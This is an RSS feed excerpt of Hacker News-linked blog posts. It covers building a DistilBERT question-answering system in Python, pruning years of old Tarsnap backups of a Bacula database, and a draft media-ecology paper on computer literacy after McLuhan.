<p>Unfortunately, this doesn't work with all PDFs. But for the time being, I have
enough manpages to read. Printing PostScript works extremely fast, by the way.
When I press return at the end of a <code>lpr</code> command, I can see the status LED on
my printer start blinking almost immediately.</p></div></div>]]>
            </description>
            <link>https://paedubucher.ch/articles/2020-09-20-basic-printing-on-openbsd.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24535357</guid>
            <pubDate>Sun, 20 Sep 2020 17:15:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bert NLP: Using DistilBert to Build a Question Answering System]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24535160">thread link</a>) | @boduma
<br/>
September 20, 2020 | https://programmerbackpack.com/bert-nlp-using-distilbert-to-build-a-question-answering-system/ | <a href="https://web.archive.org/web/*/https://programmerbackpack.com/bert-nlp-using-distilbert-to-build-a-question-answering-system/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p><strong>Question answering systems </strong>are being heavily researched at the moment thanks to huge advancements gained in the <a href="https://programmerbackpack.com/what-is-natural-language-processing-a-gentle-introduction-to-nlp/">Natural Language Processing</a> field. Key players in the industry have developed incredibly advanced models, some of which are already performing at human level. This is also the case for BERT (Bidirectional Encoder Representations from Transformers) which was developed by researchers at Google. </p><p>In this article we're going to use DistilBERT (a smaller, lightweight version of BERT) to build a small question answering system. This system will process text from Wikipedia pages and answer some questions for us. We are then going to put our model to test with some questions and analyze the results.</p><p><em>Interested in more? Follow me on Twitter at <a href="https://twitter.com/b_dmarius">@b_dmarius</a> and I'll post there every new article.</em></p><figure><img src="https://images.unsplash.com/photo-1527430253228-e93688616381?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="A little Robot"><figcaption>Photo by <a href="https://unsplash.com/@rocknrollmonkey?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Rock'n Roll Monkey</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><h3 id="article-overview">Article overview</h3><ul><li>Approach for building a question answering system</li><li>Project setup</li><li>Building a Wikipedia text extractor</li><li>Question processing</li><li>Searching for relevant context - BM25</li><li>Using DistilBERT for question answering</li><li>Building the question answering logic</li><li>Testing our system</li><li>Related articles</li><li>Conclusions</li></ul><p>Our question answering system will work in 4 stages:</p><ul><li><strong>Extract text from Wikipedia: </strong>We will download text from a few Wikipedia articles in order to build our dataset. I will cache the text in my local environment because there is no need to download the same text again and again everytime I make changes to the system.</li><li><strong>Process the question</strong>: Here I'm going to extract the most important bits of the input question, because using every word in the question would lower the accuracy of the results.</li><li><strong>Retrieve context from the text:</strong> Given an input question, we will try to find the most relevant sentences in the entire data corpus. This will help have a small search space for our answer retriever model and will lead to a higher accuracy</li><li><strong>Retrieve answer from the context: </strong>This is where our BERT model will come into action. We will feed the context from the earlier step to our model and will get our answer in return.</li></ul><p>What I'm trying to do here is what I think is found behind the instant answers that search engines sometimes offer for some search queries. If you Google "what is the capital city of Romania?" you will first get an answer box with "Bucharest" and results from other pages around the internet come below this box.</p><p>What my intuition tells me is that the search engine looks at your query and tries to find first the most relevant pages related to your question and it then looks at these pages and tries to extract a direct answer for you. This is what I also tried to do for this project.</p><p>As I was writing in the beginning of this article, a lot of research is going on in this field and the community can only benefit from this. A lot of tools have been built using the latest research results and awesome tools like this are exactly what makes this project not only possible, but also very easy and quick 😊.</p><p>First let's install <a href="https://spacy.io/">spaCy</a>, a library which I really like and which I've been using in many projects, such as <a href="https://programmerbackpack.com/python-nlp-tutorial-information-extraction-and-knowledge-graphs/">building a knowledge graph</a> or <a href="https://programmerbackpack.com/python-knowledge-graph-understanding-semantic-relationships/">analyzing semantic relationships</a>. I'm also going to download the small version of the spaCy language model for English. Larger models are available but the small version is just enough for this project.</p><pre><code>pip install spacy
python -m spacy download en_core_web_sm</code></pre><p>It's time now to install <a href="https://pypi.org/project/wikipedia/">wikipedia</a>, an awesome package for extracting text from Wikipedia pages.</p><pre><code>pip install wikipedia</code></pre><p>Next up is <a href="https://radimrehurek.com/gensim/">Gensim</a>, another package which I really enjoy using, especially for its really good <a href="https://programmerbackpack.com/explained-word2vec-word-embeddings-gensim-implementation-tutorial-and-vizualization/">Word2Vec implementation</a>.</p><pre><code>pip install gensim</code></pre><p>For the last 2 dependencies, I'll install <a href="https://pytorch.org/">pytorch</a> and t<a href="https://github.com/huggingface/transformers">ransformers from HuggingFace</a> 🤗. It's my first time using these 2 packages but I think they are really powerful and really easy and fun to work with.</p><pre><code>pip install torch
pip install transformers</code></pre><p>Now, with all our dependencies in place, it's time to start building our question answering system.</p><p>If you've been reading other articles on this blog you might already be familiar with my approach for extracting articles from Wikipedia pages. I know it's not the best or most efficient way of extracting the text, but it's quick and easy and let's you build a small, play dataset for a project. </p><p>First let's write a small class to extract the text from one Wikipedia page. Let's create a <strong>text_extractor.py </strong>file and put it in our project directory.</p><figure><pre><code>import wikipedia
import os


class TextExtractor:

    __pageTitle: str
    __pageId: str

    def __init__(self, pageTitle, pageId):
        self.__pageTitle = pageTitle
        self.__pageId = pageId

    def extract(self):
        fileName = "./text/" + self.__pageTitle + ".txt"
        if not os.path.isfile(fileName):
            page = wikipedia.page(title=self.__pageTitle, pageid=self.__pageId)
            f = open(fileName, "w")
            f.write(page.content)
            f.close()

    def getText(self):
        f = open("./text/" + self.__pageTitle + ".txt", "r")
        return f.read()</code></pre><figcaption>text_extractor.py</figcaption></figure><p>The approach is very simple here. The constructor takes 2 params, a page title and a page id. The reason for also requiring a page id is because I noticed that sometimes the wikipedia package gets confused for some titles and that's why I prefer to also use this param. To extract the page id for one Wikipedia article, go to <a href="https://www.wikidata.org/wiki/Wikidata:Main_Page">Wikidata</a> and search for your article there. The page id is the one in the brackets right after the title of your result.</p><p>As I said earlier, I'm storing the text in a local directory (/text) so that downloading the text is not necessary for every run of the project. </p><p>The second class needed for this step is a text extractor pipe. This allow us to collect multiple TextExtractor instances and combine the text from all of them into one big chunk. This is the content of the <strong>text_extractor_pipe.py </strong>file.</p><figure><pre><code>from text_extractor import TextExtractor


class TextExtractorPipe:

    __textExtractors: [TextExtractor]

    def __init__(self):
        self.__textExtractors = []

    def addTextExtractor(self, textExtractor: TextExtractor):
        self.__textExtractors.append(textExtractor)

    def extract(self) -&gt; str:
        result = ''
        for textExtractor in self.__textExtractors:
            result = result + textExtractor.getText()
        return result</code></pre><figcaption>text_extractor_pipe.py</figcaption></figure><p>It's time for the first real NLP step of this project. I'm going to do a little bit of question processing here. By that I mean I'm going to remove stop words from the original question text and keep only the essential parts. For example:</p><p><strong>Original question: </strong>"What is the capital city of Romania?"</p><p><strong>Processed question: </strong>"capital city Romania"</p><p>Why am I doing this? You might notice that the text contains words that are not necessarily essential for the question. This is especially for the purpose of this step, because we need to extract only the sentences that are the closest of all to our original question. Words like "what", "is", and especially "the" appear in too many places in our dataset and that can lower the accuracy of our search.</p><p>You might argue that the other words are important too, because once I find mentions of the capital city of Romania in the dataset, I need to know what to extract from there, what is the question that I need to answer too. And you're right, don't worry about it, we'll also keep the original question because we are going to reuse it later. But for searching purposes, the processed question should be enough.</p><p>I'm going to use spaCy to process the question. The logic here is very simple, I'm going to apply spaCy's NLP model to the question text in order to tokenize it and identify the parts of speech of all the words in the question. Then I'm going to keep only the parts of speech I'm interested in: nouns, proper nouns, and adjectives.</p><p>Here are the contents of <strong>question_processor.py.</strong></p><figure><pre><code>

class QuestionProcessor:


    def __init__(self, nlp):
        self.pos = ["NOUN", "PROPN", "ADJ"]
        self.nlp = nlp


    def process(self, text):
        tokens = self.nlp(text)
        return ' '.join(token.text for token in tokens if token.pos_ in self.pos)

</code></pre><figcaption>question_processor.py</figcaption></figure><p>Here starts the actual search for the context in which the answer to our question will probably be found. But first, we need to mention what <a href="https://en.wikipedia.org/wiki/Okapi_BM25">BM25 </a>is.</p><p><strong>BM25 </strong>is a function or an algorithm used to rank a list of documents based on a given query. That's why it is also called a ranking function. It is very similar to <a href="https://programmerbackpack.com/tf-idf-explained-and-python-implementation/">TF-IDF</a> and it is actually so good that I understand it is used in ElasticSearch for document ranking. I'm not going to go into the maths behind BM25 because it is a little too complicated for the purpose of this project, but the most relevant aspects here are:</p><ul><li>It is a bag-of-words model, and that means the algorithm disregards grammar structure but takes into account term frequencies - making it just ideal for our project.</li><li>It takes a query and helps us sort a collection of documents based on how relevant they are for that query.</li><li>The Gensim package has a very good BM25 implementation that is very easy to use.</li></ul><p>I see only good news in the list above, so let's get working 😃. Here's the approach I'm going to use:</p><ul><li>Get a list of all sentences in our dataset and the <strong>processed question</strong>.</li><li>Tokenize all our sentences and use lemmas of the words instead of the original words. The lemma of a given word is its base form (for example, we're transforming "running" to "run") and we are using it in order to improve the accuracy of our search. We're also doing it for the question text. If you want to know more about <a href="https://programmerbackpack.com/lemmatization-and-stemming-in-nlp-the-complete-practical-guide/">lemmatization and stemming you can read this article</a>.</li><li>Use the BM25 ranking function to rank all our documents against the given query.</li><li>Extract the top <em>N </em>results from the step above and build a paragraph out of all those <em>N</em> sentences.</li></ul><p>Here is the content of <strong>context_retriever.py</strong></p><figure><pre><code>from gensim.summarization.bm25 import BM25


class ContextRetriever:

    def …</code></pre></figure></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://programmerbackpack.com/bert-nlp-using-distilbert-to-build-a-question-answering-system/">https://programmerbackpack.com/bert-nlp-using-distilbert-to-build-a-question-answering-system/</a></em></p>]]>
            </description>
            <link>https://programmerbackpack.com/bert-nlp-using-distilbert-to-build-a-question-answering-system/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24535160</guid>
            <pubDate>Sun, 20 Sep 2020 16:55:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tarsnap – cleaning up old backups]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 24 (<a href="https://news.ycombinator.com/item?id=24535046">thread link</a>) | @tosh
<br/>
September 20, 2020 | https://dan.langille.org/2020/09/10/tarsnap-cleaning-up-old-backups/ | <a href="https://web.archive.org/web/*/https://dan.langille.org/2020/09/10/tarsnap-cleaning-up-old-backups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<div>
<p>I use <a href="https://www.tarsnap.com/">Tarsnap</a> for my critical data. Case in point, I use it to backup my Bacula database dump. I use Bacula to backup my hosts. The database in question keeps track of what was backed up, from what host, the file size, checksum, where that backup is now, and many other items. Losing this data is annoying but not a disaster. It can be recreated from the backup volumes, but that is time consuming. As it is, the file is dumped daily, and rsynced to multiple locations.</p>
<p>I also backup that database daily via <span>tarsnap</span>. I’ve been doing this since at least 2015-10-09.</p>
<p>The uncompressed dump of this PostgreSQL database is now about 117G. </p>
<pre># ls -l bacula.dump 
-rw-r-----  1 10839  10839  125497737071 Sep  8 03:29 bacula.dump
</pre>
<p>Let’s look at recent usage by that host:</p>
<div id="attachment_6180"><p><a href="https://dan.langille.org/wp-content/uploads/2020/09/tarsnap-usage.png"><img aria-describedby="caption-attachment-6180" loading="lazy" src="https://dan.langille.org/wp-content/uploads/2020/09/tarsnap-usage-634x1024.png" alt="tarsnap recent usaage" width="634" height="1024" srcset="https://dan.langille.org/wp-content/uploads/2020/09/tarsnap-usage-634x1024.png 634w, https://dan.langille.org/wp-content/uploads/2020/09/tarsnap-usage-186x300.png 186w, https://dan.langille.org/wp-content/uploads/2020/09/tarsnap-usage.png 747w" sizes="(max-width: 634px) 100vw, 634px"></a></p><p id="caption-attachment-6180">tarsnap recent usaage</p></div>
<p>The latest <span>Daily storage</span> value is 96G.</p>
<p>Using this command, I obtained a list of the archives stored:</p>
<pre>tarsnap --list-archives -vv &gt; ~/tarsnap-knew-archive-list
</pre>
<p>See <a href="https://www.tarsnap.com/man-tarsnap.1.html">man 1 tarsnap</a></p>
<p>I found 1751 archives, the oldest one was created on 2015-10-08 19:01:17.</p>
<p>This is a great example of <a href="https://www.tarsnap.com/deduplication-examples.html">Tarsnap deduplication and compression</a>.  I have 5 years of backups taking up only 96G and the latest backup is 113G.</p>
<p>By comparison, my other <span>tarsnap</span> backups take up this amount of space:</p>
<hr>
<table>
<tbody><tr>
<th>backup</th>
<th>size</th>
</tr>
<tr>
<td>bacula dump</td>
<td>96G</td>
</tr>
<tr>
<td>bacula configuration</td>
<td>13.7G</td>
</tr>
<tr>
<td>subversion</td>
<td>8G</td>
</tr>
<tr>
<td>supernews</td>
<td>32.5G</td>
</tr>
<tr>
<td>zuul-postgresql</td>
<td>0.18G</td>
</tr>
<tr>
<td>zuul-mysql</td>
<td>0.57G</td>
</tr>
<tr>
<td>zuul-pg02</td>
<td>5.7G</td>
</tr>
</tbody></table>
<hr>
<p>I’m going to trim down the dump archives, for sure.</p>
<p>I’m curious about that bacula configuration archive.  The Bacula configuration is only about 600K:</p>
<pre>$ cd /usr/local/etc/bacula
$ sudo du -ch .
608K	.
608K	total
$ </pre>
<p>Checking the archive list for that machine, I find 6 database backups from early October 2015.</p>
<p>Let’s delete those backups first. The names of those archives are:</p>
<pre title="">bacula.int.BaculaDatabase.2015-10-02
bacula.int.BaculaDatabase.2015-10-03
bacula.int.BaculaDatabase.2015-10-05
bacula.int.BaculaDatabase.2015-10-06
bacula.int.BaculaDatabase.2015-10-07
bacula.int.BaculaDatabase.2015-10-08
</pre>
<p>Let’s delete one:</p>
<pre># tarsnap -d -f bacula.int.BaculaDatabase.2015-10-02
                                       Total size  Compressed size
All archives                         196056412740      57482749453
  (unique data)                       50147278933      14694175940
This archive                          48831544077      14324291125
Deleted data                              2073099          1672760
# 
</pre>
<p>Let’s delete the rest (based on <a href="https://www.tarsnap.com/improve-speed.html">Delete multiple archives faster</a>:</p>
<pre>[dan@bacula:~] $ sudo tarsnap -d \
&gt; -f bacula.int.BaculaDatabase.2015-10-03 \
&gt; -f bacula.int.BaculaDatabase.2015-10-05 \
&gt; -f bacula.int.BaculaDatabase.2015-10-06 \
&gt; -f bacula.int.BaculaDatabase.2015-10-07 \
&gt; -f bacula.int.BaculaDatabase.2015-10-08
                                       Total size  Compressed size
All archives                         147224869967      43158468600
  (unique data)                       50147260360      14694156775
bacula.int.BaculaDatabase.2015-10-03      48831542773      14324280853
Deleted data                                18573            19165
                                       Total size  Compressed size
All archives                          98393327194      28834187747
  (unique data)                       50147241787      14694137610
bacula.int.BaculaDatabase.2015-10-05      48831542773      14324280853
Deleted data                                18573            19165
                                       Total size  Compressed size
All archives                          49561784421      14509906894
  (unique data)                       49265856159      14448990041
bacula.int.BaculaDatabase.2015-10-06      48831542773      14324280853
Deleted data                            881385628        245147569
                                       Total size  Compressed size
All archives                            314745728         65670242
  (unique data)                          19214507          4841679
bacula.int.BaculaDatabase.2015-10-07      49247038693      14444236652
Deleted data                          49246641652      14444148362
                                       Total size  Compressed size
All archives                            314744195         65668842
  (unique data)                          19212974          4840279
bacula.int.BaculaDatabase.2015-10-08             1533             1400
Deleted data                                 1533             1400
[dan@bacula:~] $ [dan@bacula:~] $ sudo tarsnap -d \
</pre>
<p>I won’t see the change in the ‘Recent account usage by machine’ page because that ‘updates shortly after midnight UTC’.  I’ll come back tomorrow.</p>
<p>In the meantime, I think I can delete all my old Bacula database backups from before 2020.  For fun, I will keep each backup from 01-01, and the oldest backup.</p>
<p>Here is how I can get that list from the existing file:</p>
<pre>[dan@knew:~] $ head /root/tarsnap-knew-archive-list 
bacula.int.BaculaDatabase.2020-08-13	2020-08-13 13:25:00	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2020-08-13 bacula.dump
bacula.int.BaculaDatabase.2018-08-17	2018-08-17 13:25:00	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2018-08-17 bacula.dump
bacula.int.BaculaDatabase.2018-11-08	2018-11-08 13:25:01	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2018-11-08 bacula.dump
bacula.int.BaculaDatabase.2020-07-08	2020-07-08 13:25:00	/usr/local/bin/tarsnap -c -f ˜tarbacula.int.BaculaDatabase.2020-07-08 bacula.dump
bacula.int.BaculaDatabase.2016-05-25	2016-05-25 13:25:02	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2016-05-25 bacula.dump
bacula.int.BaculaDatabase.2018-08-09	2018-08-09 13:25:02	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2018-08-09 bacula.dump
bacula.int.BaculaDatabase.2016-10-12	2016-10-12 13:25:00	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2016-10-12 bacula.dump
bacula.int.BaculaDatabase.2016-01-20	2016-01-20 13:25:00	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2016-01-20 bacula.dump
bacula.int.BaculaDatabase.2019-02-06	2019-02-06 13:25:00	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2019-02-06 bacula.dump
bacula.int.BaculaDatabase.2016-03-18	2016-03-18 13:25:04	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2016-03-18 bacula.dump
[dan@knew:~] $ cut -f 1 -w /root/tarsnap-knew-archive-list  | head
bacula.int.BaculaDatabase.2020-08-13
bacula.int.BaculaDatabase.2018-08-17
bacula.int.BaculaDatabase.2018-11-08
bacula.int.BaculaDatabase.2020-07-08
bacula.int.BaculaDatabase.2016-05-25
bacula.int.BaculaDatabase.2018-08-09
bacula.int.BaculaDatabase.2016-10-12
bacula.int.BaculaDatabase.2016-01-20
bacula.int.BaculaDatabase.2019-02-06
bacula.int.BaculaDatabase.2016-03-18
[dan@knew:~] $ 
</pre>
<p>Oh wait, let’s sort that to get a proper range:</p>
<pre>[dan@knew:/root] $ sort tarsnap-knew-archive-list | tail -2
bacula.int.BaculaDatabase.2020-09-05	2020-09-05 13:25:00	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2020-09-05 bacula.dump
bacula.int.BaculaDatabase.2020-09-07	2020-09-07 13:25:00	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2020-09-07 bacula.dump
[dan@knew:/root] $ 
</pre>
<pre>[dan@knew:/root] $ sort tarsnap-knew-archive-list | head -2
bacula.int.BaculaDatabase.2015-10-08	2015-10-08 19:01:17	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2015-10-08 bacula.dump
bacula.int.BaculaDatabase.2015-10-09	2015-10-09 13:25:00	/usr/local/bin/tarsnap -c -f bacula.int.BaculaDatabase.2015-10-09 bacula.dump
</pre>
<p>Backups going back 5 years. Yeah, that might be a bit excessive, even for me. I usually keep them for three years at home.</p>
<p>Knowing that, let’s select the entries I want to keep:</p>
<pre>[dan@knew:~] $ cut -f 1 -w /root/tarsnap-knew-archive-list  | egrep -e '-01-01|2015-10-08' | sort
bacula.int.BaculaDatabase.2015-10-08
bacula.int.BaculaDatabase.2016-01-01
bacula.int.BaculaDatabase.2017-01-01
bacula.int.BaculaDatabase.2019-01-01
bacula.int.BaculaDatabase.2020-01-01
[dan@knew:~] $ 
</pre>
<p>I sorted the output just to make it easier.</p>
<p>Now, dump everything else, by using <span>-v</span>, into a file:</p>
<pre>[dan@knew:~] $ cut -f 1 -w /root/tarsnap-knew-archive-list  | egrep -ve '-01-01|2015-10-08' &gt; tarsnap-volumes-to-delete
[dan@knew:~] $ wc -l tarsnap-volumes-to-delete 
    1746 tarsnap-volumes-to-delete
</pre>
<p>Oh wait, I forgot to exclude 2020</p>
<pre>[dan@knew:~] $ cut -f 1 -w /root/tarsnap-knew-archive-list  | egrep -ve '-01-01|2015-10-08|bacula.int.BaculaDatabase.2020' &gt; tarsnap-volumes-to-delete
[dan@knew:~] $ wc -l tarsnap-volumes-to-delete 
    1503 tarsnap-volumes-to-delete
[dan@knew:~] $ 
</pre>
<p>I used an editor to quickly modify that file to look like this:</p>
<pre>[dan@knew:~] $ head tarsnap-volumes-to-delete 
#!/bin/sh
-f bacula.int.BaculaDatabase.2018-08-17 \
-f bacula.int.BaculaDatabase.2018-11-08 \
-f bacula.int.BaculaDatabase.2016-05-25 \
-f bacula.int.BaculaDatabase.2018-08-09 \
-f bacula.int.BaculaDatabase.2016-10-12 \
-f bacula.int.BaculaDatabase.2016-01-20 \
-f bacula.int.BaculaDatabase.2019-02-06 \
-f bacula.int.BaculaDatabase.2016-03-18 \
-f bacula.int.BaculaDatabase.2018-01-15 \
[dan@knew:~] $ 
</pre>
<p>This delete will take a while so I started a <span>tmux</span> session.  I did a <span>chmod +x</span> on the file.</p>
<p>I started the command and went on to do other lines.  It is deleting 1500 archives. It will be a few hours at least I think.</p>
<pre>[dan@knew:~] $ time sudo ./tarsnap-volumes-to-delete
</pre>
<p>I wish I sorted that list. I’d know easily where we were.</p>
<p>I know we are on <span>bacula.int.BaculaDatabase.2018-08-19</span> which is line 836 of 1505.</p>
<pre> $ ps auwwx | grep tmux
dan        78234   0.0  0.0   14344    5872  -  Is   13:15       0:00.36 tmux: server (/tmp//tmux-1001/default) (tmux)
</pre>
<p><span>tmux</span> was started at 13:15 and it is now 20:49 – so that’s 7.5 hours to get about half-way through. This should finish overnight.</p>
<p>Night passes….</p>
<p>The next morning I found:</p>
<pre>real    819m10.118s
user    372m34.315s
sys     3m23.045s
</pre>
<p>That is 13 hours and 40 minutes, or about 18 every 10 minutes.</p>
<p>I want to compare before and after disk usage, but I may have to wait until 0000 UTC when the statistics are updated.</p>
<p>The next day (2020-09-10), I found these …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dan.langille.org/2020/09/10/tarsnap-cleaning-up-old-backups/">https://dan.langille.org/2020/09/10/tarsnap-cleaning-up-old-backups/</a></em></p>]]>
            </description>
            <link>https://dan.langille.org/2020/09/10/tarsnap-cleaning-up-old-backups/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24535046</guid>
            <pubDate>Sun, 20 Sep 2020 16:43:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A McLuhan-Syntonic Approach to Computer Literacy: Toppling Pillars of Cyberspace]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534975">thread link</a>) | @finnthehuman
<br/>
September 20, 2020 | http://www.concernednetizen.com/2019/01/a-mcluhan-syntonic-approach-to-computer-literacy-toppling-the-pillars-of-cyberspace/ | <a href="https://web.archive.org/web/*/http://www.concernednetizen.com/2019/01/a-mcluhan-syntonic-approach-to-computer-literacy-toppling-the-pillars-of-cyberspace/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
		<p><iframe title="My MEA Presentation at UofT: Toppling the Pillars of Cyberspace" width="676" height="380" src="https://www.youtube.com/embed/IhwLDQakjNA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p><em>On June 29th, 2019, I delivered the above presentation to the Media Ecology Association at their 20th Annual Convention in Toronto, on the U of T campus, based on this paper. Learn more about the convention at <a href="http://mediaethics.ca/">mediaethics.ca</a>. Attempts to move the paper toward a more finalized form have resulted in sprawling additions which will require much work, however I hope the draft below suffices to entertain curiosity piqued by the video. 🙂 – Clinton, 08/02/19</em></p>
<p><em>This paper is undergoing a significant re-write, not least to address some typos and add more sources. Please consider it a draft in its present form. – Clinton, 02/21/19</em></p>
<p>Cyberspace is a fictional sensory environment with a traceable history. It is formally defined — much like the Euclidean space which Wyndham Lewis feared losing, and which Marshall McLuhan announced obsolete thirty years later. Its origins lie in the mid-1960s with the programming language Simula, which standardized the now-ubiquitous object-oriented approach toward computer programming (Rheingold, 238). Combined with the file-systems of magnetic data storage devices and graphic user interfaces, cyberspace has become synonymous with computing and media as a whole. Examinations of cyberspace emphasize the fantastic and unreal nature of the medium, but seldom puncture through to the realities of computing itself.<br>
The applied methods of Marshall McLuhan promise great exploratory and explanatory power in today’s media environment if, and only if, the precise nature of digital technology as machines and as media can be acknowledged in a way commensurate to all various perceptions of them. Unlike analogue media, whose inner-workings are discrete, computing devices employ the universal Turing Machine concept which renders their operations evasive of straightforward explanation. Modern media literacy absolutely demands some basic form of full-stack computer literacy, without any permissible exceptions or objections. The alternative is control over the programmable, invisible environment being ceded to an arbitrary, self-selected few who are granted the power of technical determination over the many.<br>
After demonstrating a model of simple, full-stack computer literacy this paper will offer some exploratory probes into the nature of media and its effects in the style of Marshall McLuhan, with the aim of putting cyberspace in its proper place and revealing the hidden ground it has covered up.<span id="more-186"></span></p>
<h3>1. Computer Content vs. Media Content</h3>
<p>In the McLuhanesque sense, the content of a medium is highly visible or noticeable, to the extent that it distracts attention from the medium itself. A new medium constitutes an environment which is only subliminally processed by (and so, in turn, is subliminally processing) the beholder who is consciously fixated on the content. The content is easy to perceive because it presents itself as something old and familiar.</p>
<p>McLuhan posited that the electronic media of his time offered too much too quickly, thwarting conscious linear consideration. He claimed that human perception of them called upon in-depth, right-brain processing via mythic forms. We end up “feeling” electronic media and dynamically “making” our perception of it instead of detachedly considering it through a left-brain conceptual model which “matches” it. Since his time analogue media has been largely swallowed up by digital computers, necessitating a fresh analysis of electronic media capable of encapsulating the nature of this new medium.</p>
<p>What is the content of a computer? One answer might be the hardware inside and its specifications. A more likely answer would be the files on the hard drive, which is to say the content of the storage device. Still another answer might involve the enumeration of the software environments providing useful applications to a user’s daily or professional life. By using Marshall McLuhan’s approach toward media studies, we can develop a nuanced, technically accurate to considering computers as a medium. First, we must re-cognize the development of computer interfaces themselves, from direct representation of hardware states up to the erection of simulations of cyberspace. This can be done by roughly tracing the historical development of the personal microcomputer, beginning in 1975.</p>
<h3>2. Definition of computers and interface</h3>
<p>At the lowest level, the content of a computer is the state of each flip-flop in the RAM hardware components, signifying either a 1 or a 0 in the abstract binary code. In computer science, RAM is invariably conceptualized as a memory-space of addressable regions of bytes. When a computer is running,&nbsp; the CPU defaults to moving sequentially through each addressable byte in memory, rather like a boardgame piece or the reader of a Choose Your Own Adventure Novel. Occasionally the CPU will encounter a novel instruction at a memory address. Perhaps it hits an instruction to jump elsewhere in RAM to work on a subtask and return with an appropriate response, or to circle about in a loop, or to decide a heading on a branching path by with a logical decision based on a mathematical operation. Sometimes it is told to go to access special addresses which correspond to hardware such as the keyboard, on-screen characters, mouse, or storage devices. This is the the most straight-forward, low-level way of conceptualizing the operation of computer hardware.</p>
<p>This convoluted linearity is mirrored by the procedural programming style, in which the programmer writes the directions which the CPU will follow. The computer processor itself, in either a direct or abstracted and simplified way, is conceived as the sole agent within the computer, performing instructions as-written line by line. In the language of Alan Turing’s definition for a universal computing device, his Turing Machine, the RAM serves as the endless memory “tape” whose “cells” (memory addresses) of “symbols” (bytes) are read by the CPU in the role of “head.”</p>
<p>Programming languages are classified from low to high, depending on their level of abstraction up and away from this basic Turing Machine functionality. Machine language and its corresponding assembly language are the most low-level, meaning they directly represent the CPU’s actual operation. For the sake of this paper, they will be grouped with somewhat higher-level procedural programming languages. These afford the programmer many useful shortcuts, pre-defined functions and variables, and rudimentary use of natural language. Yet since procedural programs maintain the perspective of the CPU as the sole-agent in the computer, being instructed through a program-flow of convolutions of linear structure line-by-line, we will consider all of these to be low-level.</p>
<h3>3. Interfaces as medium</h3>
<p>Input into large, early, institutional computers from the 40s through to the 70s had been done via physical rewiring, byte-by-byte toggle switches, paper telegraph tape, paper punch cards, and teletype or typewriter-style keyboards. Output was through blinking lights, paper print-outs, and various cathode-ray tubes such as oscilloscopes and television screens. The recapitulation of this procession at the microcomputer level was very quick. The toggle switches and blinking lights of the MITS Altair 8800 in allowed hobbyists in 1975 to enter machine-code into the RAM byte by byte and inspect the contents. By only 1977 the Apple II, Commodore PET, and Radio Shack TRS-80 provided home and business users with affordable use of a keyboard and television interface to an interactive, procedural BASIC-language prompt.</p>
<p>Marshall McLuhan warned that the content of a medium, the object of focus, was always a distraction from the medium itself. Low-level software inheres tightly to the hardware of the machine in a complementary way, rendering the hardware naked for use. The computer is, in this case, a highly-intricate mechanical machine and its software is merely a highly-mutable part of its mechanism and not “content” in the media-sense of the term. Content must be whatever meaningful thing the keyboard and screen – the input and output devices – are communicating with the user about via interface.</p>
<p>In a media-studies sense, content is perception, Even though we might know something is in a computer, it is not “content” until it is striking our raw senses.</p>
<h3>4. Code in execution and storage</h3>
<p>Putting a program into RAM requires the computer to be turned on, and for the CPU to be “idling” until it can be set on its path through the memory addresses containing the software to be executed. The MITS Altair 8800 had a “STOP/RUN” toggle switch to change between these two modes in their purest, most direct form. Afterwards microcomputers would come with a bare-minimum of programming pre-written into a ROM chip soldered onto the motherboard, automatically be loaded into RAM the moment it powered on. On the Apple II, PET, and TRS-80 this ROM chip contain an interactive BASIC programming language environment which, in execution, would present an on-screen prompt in which the user could type individual BASIC instructions for instant execution, or complete BASIC programs.</p>
<p>This back and forth between source code and execution reveals or closely mimics the interplay between RAM and CPU. For this reason, I would say that these first generation microcomputers present the computer as content of its own interface. To program a computer at a low-level is to have perception of the dynamics of its deepest inner-workings. This might be an exaggeration, but this is as purely transparent as it gets for commercially-produced, mass-market computers. The RAM is clearly presented as a space to be filled with bytes from the keyboard; instructions written in the convoluted linear procedural style of the operations of a CPU. The computer screen is like an open box with no false-bottoms, revealing all contents.</p>
<p>RAM is volatile, which means it is cleared when power is turned off. Saving computer data between power-cycles requires …</p></div></div>
